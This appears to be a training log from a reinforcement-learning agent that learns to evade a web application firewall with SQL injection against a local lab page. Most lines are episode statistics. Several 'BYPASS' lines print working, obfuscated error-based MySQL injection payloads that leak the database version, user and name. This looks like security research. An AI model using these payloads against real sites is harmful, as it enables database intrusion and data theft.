/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.65
  Ep 3070 | SR=0% | Steps=15.0 | R=-37.17
  Ep 3080 | SR=0% | Steps=15.0 | R=-38.01
  [BYPASS] Ep 3089 | steps=9 | seq=null_byte -> case -> func_sp_nbsp -> func_sp_ff -> func_sp_ff -> null_byte -> null_byte -> case -> formfeed
           payload: 1'%0caND%0cEXP(~(SeLECT%0c*%0cfROM%0c(seLEct%0c(version%a0()))a));%00
  Ep 3090 | SR=10% | Steps=14.4 | R=-35.29
  Ep 3100 | SR=0% | Steps=15.0 | R=-37.91
  Ep 3110 | SR=0% | Steps=15.0 | R=-36.71
  Ep 3120 | SR=0% | Steps=15.0 | R=-37.46
  Ep 3130 | SR=0% | Steps=15.0 | R=-37.00
  Ep 3140 | SR=0% | Steps=15.0 | R=-38.09
  Ep 3150 | SR=0% | Steps=15.0 | R=-37.46
  Ep 3160 | SR=0% | Steps=15.0 | R=-36.38
  Ep 3170 | SR=0% | Steps=15.0 | R=-35.36
  Ep 3180 | SR=0% | Steps=15.0 | R=-36.96
  Ep 3190 | SR=0% | Steps=15.0 | R=-37.14
  Ep 3200 | SR=0% | Steps=15.0 | R=-37.11
  Ep 3210 | SR=0% | Steps=15.0 | R=-37.26
  Ep 3220 | SR=0% | Steps=15.0 | R=-37.62
  Ep 3230 | SR=0% | Steps=15.0 | R=-36.34
  Ep 3240 | SR=0% | Steps=15.0 | R=-36.86
  Ep 3250 | SR=0% | Steps=15.0 | R=-36.57
  Ep 3260 | SR=0% | Steps=15.0 | R=-37.05
  Ep 3270 | SR=0% | Steps=15.0 | R=-37.50
  Ep 3280 | SR=0% | Steps=15.0 | R=-36.86
  [BYPASS] Ep 3287 | steps=8 | seq=case -> case -> between_space -> null_byte -> case -> nested_and -> case -> func_sp_nbsp
           payload: 1'%a0aNd%a0GTID_SUBSET((user%a0()),1);%00
  Ep 3290 | SR=10% | Steps=14.3 | R=-33.72
  Ep 3300 | SR=0% | Steps=15.0 | R=-36.58
  Ep 3310 | SR=0% | Steps=15.0 | R=-37.85
  Ep 3320 | SR=0% | Steps=15.0 | R=-36.70
  Ep 3330 | SR=0% | Steps=15.0 | R=-37.47
  Ep 3340 | SR=0% | Steps=15.0 | R=-36.86
  Ep 3350 | SR=0% | Steps=15.0 | R=-37.70
  Ep 3360 | SR=0% | Steps=15.0 | R=-36.45
  Ep 3370 | SR=0% | Steps=15.0 | R=-37.17
  Ep 3380 | SR=0% | Steps=15.0 | R=-37.64
  Ep 3390 | SR=0% | Steps=15.0 | R=-37.13
  Ep 3400 | SR=0% | Steps=15.0 | R=-36.38
  Ep 3410 | SR=0% | Steps=15.0 | R=-36.10
  Ep 3420 | SR=0% | Steps=15.0 | R=-36.09
  Ep 3430 | SR=0% | Steps=15.0 | R=-36.97
  Ep 3440 | SR=0% | Steps=15.0 | R=-36.74
  Ep 3450 | SR=0% | Steps=15.0 | R=-37.47
  Ep 3460 | SR=0% | Steps=15.0 | R=-36.54
  Ep 3470 | SR=0% | Steps=15.0 | R=-36.63
  [BYPASS] Ep 3472 | steps=7 | seq=case -> between_space -> null_byte -> case -> case -> case -> func_sp_nbsp
           payload: 1'%a0AND%a0GTID_SUBSET((dAtabASE%a0()),1);%00
  Ep 3480 | SR=10% | Steps=14.2 | R=-32.82
  Ep 3490 | SR=0% | Steps=15.0 | R=-37.47
  Ep 3500 | SR=0% | Steps=15.0 | R=-36.57
  Ep 3510 | SR=0% | Steps=15.0 | R=-36.79
  Ep 3520 | SR=0% | Steps=15.0 | R=-37.18
  Ep 3530 | SR=0% | Steps=15.0 | R=-37.40
  Ep 3540 | SR=0% | Steps=15.0 | R=-38.22
  Ep 3550 | SR=0% | Steps=15.0 | R=-37.42
  Ep 3560 | SR=0% | Steps=15.0 | R=-37.28
  Ep 3570 | SR=0% | Steps=15.0 | R=-37.42
  Ep 3580 | SR=0% | Steps=15.0 | R=-36.76
  Ep 3590 | SR=0% | Steps=15.0 | R=-36.95
  Ep 3600 | SR=0% | Steps=15.0 | R=-36.94
  Ep 3610 | SR=0% | Steps=15.0 | R=-37.06
  Ep 3620 | SR=0% | Steps=15.0 | R=-37.58
  Ep 3630 | SR=0% | Steps=15.0 | R=-37.86
  Ep 3640 | SR=0% | Steps=15.0 | R=-37.33
  Ep 3650 | SR=0% | Steps=15.0 | R=-37.19
  Ep 3660 | SR=0% | Steps=15.0 | R=-37.18
  Ep 3670 | SR=0% | Steps=15.0 | R=-36.49
  Ep 3680 | SR=0% | Steps=15.0 | R=-36.31
  Ep 3690 | SR=0% | Steps=15.0 | R=-36.60
  Ep 3700 | SR=0% | Steps=15.0 | R=-37.17
  Ep 3710 | SR=0% | Steps=15.0 | R=-36.91
  Ep 3720 | SR=0% | Steps=15.0 | R=-37.17
  Ep 3730 | SR=0% | Steps=15.0 | R=-37.80
  Ep 3740 | SR=0% | Steps=15.0 | R=-36.14
  Ep 3750 | SR=0% | Steps=15.0 | R=-36.83
  Ep 3760 | SR=0% | Steps=15.0 | R=-36.61
  Ep 3770 | SR=0% | Steps=15.0 | R=-37.61
  Ep 3780 | SR=0% | Steps=15.0 | R=-36.95
  Ep 3790 | SR=0% | Steps=15.0 | R=-36.70
  Ep 3800 | SR=0% | Steps=15.0 | R=-37.14
  Ep 3810 | SR=0% | Steps=15.0 | R=-37.04
  Ep 3820 | SR=0% | Steps=15.0 | R=-36.33
  Ep 3830 | SR=0% | Steps=15.0 | R=-36.98
  Ep 3840 | SR=0% | Steps=15.0 | R=-37.24
  Ep 3850 | SR=0% | Steps=15.0 | R=-36.55
  Ep 3860 | SR=0% | Steps=15.0 | R=-35.94
  Ep 3870 | SR=0% | Steps=15.0 | R=-37.33
  Ep 3880 | SR=0% | Steps=15.0 | R=-36.84
  Ep 3890 | SR=0% | Steps=15.0 | R=-37.25
  Ep 3900 | SR=0% | Steps=15.0 | R=-36.54
  Ep 3910 | SR=0% | Steps=15.0 | R=-36.68
  Ep 3920 | SR=0% | Steps=15.0 | R=-36.08
  Ep 3930 | SR=0% | Steps=15.0 | R=-37.01
  Ep 3940 | SR=0% | Steps=15.0 | R=-36.24
  Ep 3950 | SR=0% | Steps=15.0 | R=-36.95
  Ep 3960 | SR=0% | Steps=15.0 | R=-36.25
  Ep 3970 | SR=0% | Steps=15.0 | R=-37.35
  Ep 3980 | SR=0% | Steps=15.0 | R=-37.50
  Ep 3990 | SR=0% | Steps=15.0 | R=-36.98
  Ep 4000 | SR=0% | Steps=15.0 | R=-37.00
  Ep 4010 | SR=0% | Steps=15.0 | R=-37.05
  Ep 4020 | SR=0% | Steps=15.0 | R=-37.24
  Ep 4030 | SR=0% | Steps=15.0 | R=-36.31
  Ep 4040 | SR=0% | Steps=15.0 | R=-36.49
  Ep 4050 | SR=0% | Steps=15.0 | R=-37.02
  Ep 4060 | SR=0% | Steps=15.0 | R=-36.15
  Ep 4070 | SR=0% | Steps=15.0 | R=-36.14
  Ep 4080 | SR=0% | Steps=15.0 | R=-35.94
  Ep 4090 | SR=0% | Steps=15.0 | R=-36.26
  Ep 4100 | SR=0% | Steps=15.0 | R=-36.28
  Ep 4110 | SR=0% | Steps=15.0 | R=-36.24
  Ep 4120 | SR=0% | Steps=15.0 | R=-36.87
  Ep 4130 | SR=0% | Steps=15.0 | R=-35.74
  Ep 4140 | SR=0% | Steps=15.0 | R=-35.84
  Ep 4150 | SR=0% | Steps=15.0 | R=-36.79
  Ep 4160 | SR=0% | Steps=15.0 | R=-36.18
  Ep 4170 | SR=0% | Steps=15.0 | R=-36.52
  Ep 4180 | SR=0% | Steps=15.0 | R=-37.59
  Ep 4190 | SR=0% | Steps=15.0 | R=-35.77
  Ep 4200 | SR=0% | Steps=15.0 | R=-36.33
  Ep 4210 | SR=0% | Steps=15.0 | R=-36.85
  Ep 4220 | SR=0% | Steps=15.0 | R=-35.67
  Ep 4230 | SR=0% | Steps=15.0 | R=-35.76
  Ep 4240 | SR=0% | Steps=15.0 | R=-36.53
  Ep 4250 | SR=0% | Steps=15.0 | R=-35.91
  Ep 4260 | SR=0% | Steps=15.0 | R=-36.54
  Ep 4270 | SR=0% | Steps=15.0 | R=-36.11
  Ep 4280 | SR=0% | Steps=15.0 | R=-36.13
  Ep 4290 | SR=0% | Steps=15.0 | R=-35.86
  Ep 4300 | SR=0% | Steps=15.0 | R=-36.30
  Ep 4310 | SR=0% | Steps=15.0 | R=-36.58
  Ep 4320 | SR=0% | Steps=15.0 | R=-36.17
  Ep 4330 | SR=0% | Steps=15.0 | R=-36.38
  Ep 4340 | SR=0% | Steps=15.0 | R=-36.69
  Ep 4350 | SR=0% | Steps=15.0 | R=-36.64
  Ep 4360 | SR=0% | Steps=15.0 | R=-35.53
  Ep 4370 | SR=0% | Steps=15.0 | R=-36.09
  Ep 4380 | SR=0% | Steps=15.0 | R=-35.81
  Ep 4390 | SR=0% | Steps=15.0 | R=-35.50
  Ep 4400 | SR=0% | Steps=15.0 | R=-35.95
  Ep 4410 | SR=0% | Steps=15.0 | R=-36.43
  Ep 4420 | SR=0% | Steps=15.0 | R=-35.89
  Ep 4430 | SR=0% | Steps=15.0 | R=-36.06
  Ep 4440 | SR=0% | Steps=15.0 | R=-36.51
  Ep 4450 | SR=0% | Steps=15.0 | R=-36.03
  Ep 4460 | SR=0% | Steps=15.0 | R=-36.70
  Ep 4470 | SR=0% | Steps=15.0 | R=-36.03
  Ep 4480 | SR=0% | Steps=15.0 | R=-35.63
  Ep 4490 | SR=0% | Steps=15.0 | R=-36.09
  Ep 4500 | SR=0% | Steps=15.0 | R=-36.00
  Ep 4510 | SR=0% | Steps=15.0 | R=-36.08
  Ep 4520 | SR=0% | Steps=15.0 | R=-36.48
  Ep 4530 | SR=0% | Steps=15.0 | R=-35.72
  Ep 4540 | SR=0% | Steps=15.0 | R=-35.72
  Ep 4550 | SR=0% | Steps=15.0 | R=-35.94
  Ep 4560 | SR=0% | Steps=15.0 | R=-36.24
  Ep 4570 | SR=0% | Steps=15.0 | R=-35.33
  Ep 4580 | SR=0% | Steps=15.0 | R=-35.17
  Ep 4590 | SR=0% | Steps=15.0 | R=-35.78
  Ep 4600 | SR=0% | Steps=15.0 | R=-36.93
  Ep 4610 | SR=0% | Steps=15.0 | R=-36.54
  Ep 4620 | SR=0% | Steps=15.0 | R=-35.50
  Ep 4630 | SR=0% | Steps=15.0 | R=-36.01
  Ep 4640 | SR=0% | Steps=15.0 | R=-36.32
  Ep 4650 | SR=0% | Steps=15.0 | R=-35.42
  Ep 4660 | SR=0% | Steps=15.0 | R=-35.70
  Ep 4670 | SR=0% | Steps=15.0 | R=-36.18
  Ep 4680 | SR=0% | Steps=15.0 | R=-35.79
  Ep 4690 | SR=0% | Steps=15.0 | R=-36.31
  Ep 4700 | SR=0% | Steps=15.0 | R=-36.28
  Ep 4710 | SR=0% | Steps=15.0 | R=-36.79
  Ep 4720 | SR=0% | Steps=15.0 | R=-35.99
  Ep 4730 | SR=0% | Steps=15.0 | R=-35.65
  Ep 4740 | SR=0% | Steps=15.0 | R=-35.56
  Ep 4750 | SR=0% | Steps=15.0 | R=-36.25
  Ep 4760 | SR=0% | Steps=15.0 | R=-35.86
  Ep 4770 | SR=0% | Steps=15.0 | R=-34.87
  Ep 4780 | SR=0% | Steps=15.0 | R=-35.83
  Ep 4790 | SR=0% | Steps=15.0 | R=-35.31
  Ep 4800 | SR=0% | Steps=15.0 | R=-36.26
  Ep 4810 | SR=0% | Steps=15.0 | R=-35.52
  Ep 4820 | SR=0% | Steps=15.0 | R=-36.29
  Ep 4830 | SR=0% | Steps=15.0 | R=-35.84
  Ep 4840 | SR=0% | Steps=15.0 | R=-35.40
  Ep 4850 | SR=0% | Steps=15.0 | R=-35.64
  Ep 4860 | SR=0% | Steps=15.0 | R=-35.93
  Ep 4870 | SR=0% | Steps=15.0 | R=-35.88
  Ep 4880 | SR=0% | Steps=15.0 | R=-35.70
  Ep 4890 | SR=0% | Steps=15.0 | R=-35.23
  Ep 4900 | SR=0% | Steps=15.0 | R=-35.33
  Ep 4910 | SR=0% | Steps=15.0 | R=-35.68
  Ep 4920 | SR=0% | Steps=15.0 | R=-36.15
  Ep 4930 | SR=0% | Steps=15.0 | R=-35.41
  Ep 4940 | SR=0% | Steps=15.0 | R=-35.85
  Ep 4950 | SR=0% | Steps=15.0 | R=-35.76
  Ep 4960 | SR=0% | Steps=15.0 | R=-35.95
  Ep 4970 | SR=0% | Steps=15.0 | R=-36.03
  Ep 4980 | SR=0% | Steps=15.0 | R=-35.71
  Ep 4990 | SR=0% | Steps=15.0 | R=-35.57
  Ep 5000 | SR=0% | Steps=15.0 | R=-36.98
  Ep 5010 | SR=0% | Steps=15.0 | R=-35.67
  Ep 5020 | SR=0% | Steps=15.0 | R=-35.91
  Ep 5030 | SR=0% | Steps=15.0 | R=-35.62
  Ep 5040 | SR=0% | Steps=15.0 | R=-35.43
  Ep 5050 | SR=0% | Steps=15.0 | R=-35.34
  Ep 5060 | SR=0% | Steps=15.0 | R=-35.30
  Ep 5070 | SR=0% | Steps=15.0 | R=-35.45
  Ep 5080 | SR=0% | Steps=15.0 | R=-35.27
  Ep 5090 | SR=0% | Steps=15.0 | R=-35.25
  Ep 5100 | SR=0% | Steps=15.0 | R=-35.66
  Ep 5110 | SR=0% | Steps=15.0 | R=-35.20
  Ep 5120 | SR=0% | Steps=15.0 | R=-35.40
  Ep 5130 | SR=0% | Steps=15.0 | R=-36.65
  Ep 5140 | SR=0% | Steps=15.0 | R=-35.68
  Ep 5150 | SR=0% | Steps=15.0 | R=-36.29
  Ep 5160 | SR=0% | Steps=15.0 | R=-35.45
  Ep 5170 | SR=0% | Steps=15.0 | R=-36.35
  Ep 5180 | SR=0% | Steps=15.0 | R=-35.41
  Ep 5190 | SR=0% | Steps=15.0 | R=-35.36
  Ep 5200 | SR=0% | Steps=15.0 | R=-35.67
  Ep 5210 | SR=0% | Steps=15.0 | R=-35.86
  Ep 5220 | SR=0% | Steps=15.0 | R=-35.22
  Ep 5230 | SR=0% | Steps=15.0 | R=-35.02
  Ep 5240 | SR=0% | Steps=15.0 | R=-36.26
  Ep 5250 | SR=0% | Steps=15.0 | R=-35.08
  Ep 5260 | SR=0% | Steps=15.0 | R=-35.38
  Ep 5270 | SR=0% | Steps=15.0 | R=-35.28
  Ep 5280 | SR=0% | Steps=15.0 | R=-35.82
  Ep 5290 | SR=0% | Steps=15.0 | R=-35.19
  Ep 5300 | SR=0% | Steps=15.0 | R=-35.63
  Ep 5310 | SR=0% | Steps=15.0 | R=-35.54
  Ep 5320 | SR=0% | Steps=15.0 | R=-35.19
  Ep 5330 | SR=0% | Steps=15.0 | R=-35.71
  Ep 5340 | SR=0% | Steps=15.0 | R=-35.50
  Ep 5350 | SR=0% | Steps=15.0 | R=-35.36
  Ep 5360 | SR=0% | Steps=15.0 | R=-35.52
  Ep 5370 | SR=0% | Steps=15.0 | R=-35.22
  Ep 5380 | SR=0% | Steps=15.0 | R=-35.10
  Ep 5390 | SR=0% | Steps=15.0 | R=-35.77
  Ep 5400 | SR=0% | Steps=15.0 | R=-35.17
  Ep 5410 | SR=0% | Steps=15.0 | R=-35.05
  Ep 5420 | SR=0% | Steps=15.0 | R=-35.48
  Ep 5430 | SR=0% | Steps=15.0 | R=-35.61
  Ep 5440 | SR=0% | Steps=15.0 | R=-35.74
  Ep 5450 | SR=0% | Steps=15.0 | R=-35.11
  Ep 5460 | SR=0% | Steps=15.0 | R=-35.12
  Ep 5470 | SR=0% | Steps=15.0 | R=-34.87
  Ep 5480 | SR=0% | Steps=15.0 | R=-35.17
  Ep 5490 | SR=0% | Steps=15.0 | R=-35.18
  Ep 5500 | SR=0% | Steps=15.0 | R=-36.15
  Ep 5510 | SR=0% | Steps=15.0 | R=-35.82
  Ep 5520 | SR=0% | Steps=15.0 | R=-35.33
  Ep 5530 | SR=0% | Steps=15.0 | R=-35.28
  Ep 5540 | SR=0% | Steps=15.0 | R=-35.05
  Ep 5550 | SR=0% | Steps=15.0 | R=-35.70
  Ep 5560 | SR=0% | Steps=15.0 | R=-35.44
  Ep 5570 | SR=0% | Steps=15.0 | R=-35.60
  Ep 5580 | SR=0% | Steps=15.0 | R=-36.71
  Ep 5590 | SR=0% | Steps=15.0 | R=-37.11
  Ep 5600 | SR=0% | Steps=15.0 | R=-36.06
  Ep 5610 | SR=0% | Steps=15.0 | R=-35.28
  Ep 5620 | SR=0% | Steps=15.0 | R=-35.48
  Ep 5630 | SR=0% | Steps=15.0 | R=-35.99
  Ep 5640 | SR=0% | Steps=15.0 | R=-36.07
  Ep 5650 | SR=0% | Steps=15.0 | R=-35.45
  Ep 5660 | SR=0% | Steps=15.0 | R=-35.95
  Ep 5670 | SR=0% | Steps=15.0 | R=-35.04
  Ep 5680 | SR=0% | Steps=15.0 | R=-36.03
  Ep 5690 | SR=0% | Steps=15.0 | R=-35.70
  Ep 5700 | SR=0% | Steps=15.0 | R=-35.62
  Ep 5710 | SR=0% | Steps=15.0 | R=-35.51
  Ep 5720 | SR=0% | Steps=15.0 | R=-35.35
  Ep 5730 | SR=0% | Steps=15.0 | R=-35.64
  Ep 5740 | SR=0% | Steps=15.0 | R=-35.91
  Ep 5750 | SR=0% | Steps=15.0 | R=-35.35
  Ep 5760 | SR=0% | Steps=15.0 | R=-35.84
  Ep 5770 | SR=0% | Steps=15.0 | R=-35.86
  Ep 5780 | SR=0% | Steps=15.0 | R=-36.02
  Ep 5790 | SR=0% | Steps=15.0 | R=-35.53
  Ep 5800 | SR=0% | Steps=15.0 | R=-35.56
  Ep 5810 | SR=0% | Steps=15.0 | R=-35.35
  Ep 5820 | SR=0% | Steps=15.0 | R=-35.09
  Ep 5830 | SR=0% | Steps=15.0 | R=-35.55
  Ep 5840 | SR=0% | Steps=15.0 | R=-35.27
  Ep 5850 | SR=0% | Steps=15.0 | R=-35.51
  Ep 5860 | SR=0% | Steps=15.0 | R=-35.78
  Ep 5870 | SR=0% | Steps=15.0 | R=-35.90
  Ep 5880 | SR=0% | Steps=15.0 | R=-35.22
  Ep 5890 | SR=0% | Steps=15.0 | R=-35.58
  Ep 5900 | SR=0% | Steps=15.0 | R=-35.29
  Ep 5910 | SR=0% | Steps=15.0 | R=-35.48
  Ep 5920 | SR=0% | Steps=15.0 | R=-35.08
  Ep 5930 | SR=0% | Steps=15.0 | R=-35.93
  Ep 5940 | SR=0% | Steps=15.0 | R=-35.58
  Ep 5950 | SR=0% | Steps=15.0 | R=-35.45
  Ep 5960 | SR=0% | Steps=15.0 | R=-35.91
  Ep 5970 | SR=0% | Steps=15.0 | R=-35.40
  Ep 5980 | SR=0% | Steps=15.0 | R=-35.57
  Ep 5990 | SR=0% | Steps=15.0 | R=-35.38
  Ep 6000 | SR=0% | Steps=15.0 | R=-35.18
  Ep 6010 | SR=0% | Steps=15.0 | R=-35.33
  Ep 6020 | SR=0% | Steps=15.0 | R=-35.31
  Ep 6030 | SR=0% | Steps=15.0 | R=-35.01
  Ep 6040 | SR=0% | Steps=15.0 | R=-35.18
  Ep 6050 | SR=0% | Steps=15.0 | R=-35.51
  Ep 6060 | SR=0% | Steps=15.0 | R=-35.65
  Ep 6070 | SR=0% | Steps=15.0 | R=-35.12
  Ep 6080 | SR=0% | Steps=15.0 | R=-35.57
  Ep 6090 | SR=0% | Steps=15.0 | R=-34.86
  Ep 6100 | SR=0% | Steps=15.0 | R=-35.39
  Ep 6110 | SR=0% | Steps=15.0 | R=-36.44
  Ep 6120 | SR=0% | Steps=15.0 | R=-36.01
  Ep 6130 | SR=0% | Steps=15.0 | R=-35.08
  Ep 6140 | SR=0% | Steps=15.0 | R=-35.63
  Ep 6150 | SR=0% | Steps=15.0 | R=-35.23
  Ep 6160 | SR=0% | Steps=15.0 | R=-36.22
  Ep 6170 | SR=0% | Steps=15.0 | R=-35.66
  Ep 6180 | SR=0% | Steps=15.0 | R=-35.08
  Ep 6190 | SR=0% | Steps=15.0 | R=-35.28
  Ep 6200 | SR=0% | Steps=15.0 | R=-35.02
  Ep 6210 | SR=0% | Steps=15.0 | R=-35.85
  Ep 6220 | SR=0% | Steps=15.0 | R=-35.74
  Ep 6230 | SR=0% | Steps=15.0 | R=-35.74
  Ep 6240 | SR=0% | Steps=15.0 | R=-35.55
  Ep 6250 | SR=0% | Steps=15.0 | R=-35.87
  Ep 6260 | SR=0% | Steps=15.0 | R=-34.82
  Ep 6270 | SR=0% | Steps=15.0 | R=-35.36
  Ep 6280 | SR=0% | Steps=15.0 | R=-35.30
  [BYPASS] Ep 6283 | steps=5 | seq=null_byte -> case -> between_space -> case -> func_sp_nbsp
           payload: 1'%a0ANd%a0GTID_SUBSET((version%a0()),1);%00
  Ep 6290 | SR=10% | Steps=14.0 | R=-31.79
  [BYPASS] Ep 6299 | steps=7 | seq=null_byte -> case -> between_space -> case -> case -> case -> func_sp_nbsp
           payload: 1'%a0ANd%a0EXP(~(SeleCT%a0*%a0froM%a0(SElEct%a0(user%a0()))a));%00
  Ep 6300 | SR=10% | Steps=14.2 | R=-32.16
  Ep 6310 | SR=0% | Steps=15.0 | R=-35.86
  Ep 6320 | SR=0% | Steps=15.0 | R=-35.63
  Ep 6330 | SR=0% | Steps=15.0 | R=-35.34
  Ep 6340 | SR=0% | Steps=15.0 | R=-36.40
  Ep 6350 | SR=0% | Steps=15.0 | R=-34.86
  [BYPASS] Ep 6351 | steps=6 | seq=null_byte -> case -> between_space -> case -> case -> func_sp_nbsp
           payload: 1'%a0ANd%a0GTID_SUBSET((user%a0()),1);%00
  Ep 6360 | SR=10% | Steps=14.1 | R=-32.23
  [BYPASS] Ep 6361 | steps=5 | seq=null_byte -> case -> between_space -> case -> func_sp_nbsp
           payload: 1'%a0aNd%a0GTID_SUBSET((user%a0()),1);%00
  Ep 6370 | SR=10% | Steps=14.0 | R=-32.18
  Ep 6380 | SR=0% | Steps=15.0 | R=-35.48
  Ep 6390 | SR=0% | Steps=15.0 | R=-36.01
  Ep 6400 | SR=0% | Steps=15.0 | R=-35.63
  Ep 6410 | SR=0% | Steps=15.0 | R=-35.64
  Ep 6420 | SR=0% | Steps=15.0 | R=-35.93
  Ep 6430 | SR=0% | Steps=15.0 | R=-36.31
  Ep 6440 | SR=0% | Steps=15.0 | R=-35.62
  Ep 6450 | SR=0% | Steps=15.0 | R=-35.48
  Ep 6460 | SR=0% | Steps=15.0 | R=-35.73
  Ep 6470 | SR=0% | Steps=15.0 | R=-35.24
  Ep 6480 | SR=0% | Steps=15.0 | R=-35.69
  Ep 6490 | SR=0% | Steps=15.0 | R=-36.40
  Ep 6500 | SR=0% | Steps=15.0 | R=-35.91
  Ep 6510 | SR=0% | Steps=15.0 | R=-35.88
  Ep 6520 | SR=0% | Steps=15.0 | R=-35.60
  Ep 6530 | SR=0% | Steps=15.0 | R=-35.59
  Ep 6540 | SR=0% | Steps=15.0 | R=-35.70
  Ep 6550 | SR=0% | Steps=15.0 | R=-35.30
  Ep 6560 | SR=0% | Steps=15.0 | R=-35.69
  Ep 6570 | SR=0% | Steps=15.0 | R=-35.56
  Ep 6580 | SR=0% | Steps=15.0 | R=-35.51
  Ep 6590 | SR=0% | Steps=15.0 | R=-36.11
  Ep 6600 | SR=0% | Steps=15.0 | R=-35.99
  Ep 6610 | SR=0% | Steps=15.0 | R=-35.31
  Ep 6620 | SR=0% | Steps=15.0 | R=-35.08
  Ep 6630 | SR=0% | Steps=15.0 | R=-36.17
  Ep 6640 | SR=0% | Steps=15.0 | R=-35.86
  Ep 6650 | SR=0% | Steps=15.0 | R=-36.06
  Ep 6660 | SR=0% | Steps=15.0 | R=-35.36
  Ep 6670 | SR=0% | Steps=15.0 | R=-35.57
  Ep 6680 | SR=0% | Steps=15.0 | R=-35.63
  Ep 6690 | SR=0% | Steps=15.0 | R=-34.85
  Ep 6700 | SR=0% | Steps=15.0 | R=-35.47
  Ep 6710 | SR=0% | Steps=15.0 | R=-35.08
  Ep 6720 | SR=0% | Steps=15.0 | R=-35.66
  Ep 6730 | SR=0% | Steps=15.0 | R=-35.19
  Ep 6740 | SR=0% | Steps=15.0 | R=-35.98
  Ep 6750 | SR=0% | Steps=15.0 | R=-35.72
  Ep 6760 | SR=0% | Steps=15.0 | R=-35.51
  Ep 6770 | SR=0% | Steps=15.0 | R=-36.09
  Ep 6780 | SR=0% | Steps=15.0 | R=-35.60
  Ep 6790 | SR=0% | Steps=15.0 | R=-35.36
  Ep 6800 | SR=0% | Steps=15.0 | R=-35.38
  Ep 6810 | SR=0% | Steps=15.0 | R=-35.11
  Ep 6820 | SR=0% | Steps=15.0 | R=-35.92
  Ep 6830 | SR=0% | Steps=15.0 | R=-35.95
  Ep 6840 | SR=0% | Steps=15.0 | R=-35.75
  Ep 6850 | SR=0% | Steps=15.0 | R=-35.47
  Ep 6860 | SR=0% | Steps=15.0 | R=-36.19
  Ep 6870 | SR=0% | Steps=15.0 | R=-35.45
  Ep 6880 | SR=0% | Steps=15.0 | R=-35.47
  Ep 6890 | SR=0% | Steps=15.0 | R=-36.18
  Ep 6900 | SR=0% | Steps=15.0 | R=-35.56
  Ep 6910 | SR=0% | Steps=15.0 | R=-35.62
  Ep 6920 | SR=0% | Steps=15.0 | R=-35.93
  Ep 6930 | SR=0% | Steps=15.0 | R=-35.91
  Ep 6940 | SR=0% | Steps=15.0 | R=-35.95
  Ep 6950 | SR=0% | Steps=15.0 | R=-35.52
  Ep 6960 | SR=0% | Steps=15.0 | R=-35.86
  Ep 6970 | SR=0% | Steps=15.0 | R=-35.20
  Ep 6980 | SR=0% | Steps=15.0 | R=-35.31
  Ep 6990 | SR=0% | Steps=15.0 | R=-35.55
  Ep 7000 | SR=0% | Steps=15.0 | R=-35.69
  Ep 7010 | SR=0% | Steps=15.0 | R=-36.28
  Ep 7020 | SR=0% | Steps=15.0 | R=-35.90
  Ep 7030 | SR=0% | Steps=15.0 | R=-35.53
  Ep 7040 | SR=0% | Steps=15.0 | R=-35.66
  Ep 7050 | SR=0% | Steps=15.0 | R=-35.76
  Ep 7060 | SR=0% | Steps=15.0 | R=-35.82
  Ep 7070 | SR=0% | Steps=15.0 | R=-35.81
  Ep 7080 | SR=0% | Steps=15.0 | R=-35.62
  Ep 7090 | SR=0% | Steps=15.0 | R=-35.49
  Ep 7100 | SR=0% | Steps=15.0 | R=-35.41
  Ep 7110 | SR=0% | Steps=15.0 | R=-35.96
  Ep 7120 | SR=0% | Steps=15.0 | R=-35.28
  Ep 7130 | SR=0% | Steps=15.0 | R=-35.50
  Ep 7140 | SR=0% | Steps=15.0 | R=-35.28
  Ep 7150 | SR=0% | Steps=15.0 | R=-35.52
  Ep 7160 | SR=0% | Steps=15.0 | R=-35.45
  Ep 7170 | SR=0% | Steps=15.0 | R=-36.00
  Ep 7180 | SR=0% | Steps=15.0 | R=-36.18
  Ep 7190 | SR=0% | Steps=15.0 | R=-35.38
  Ep 7200 | SR=0% | Steps=15.0 | R=-35.28
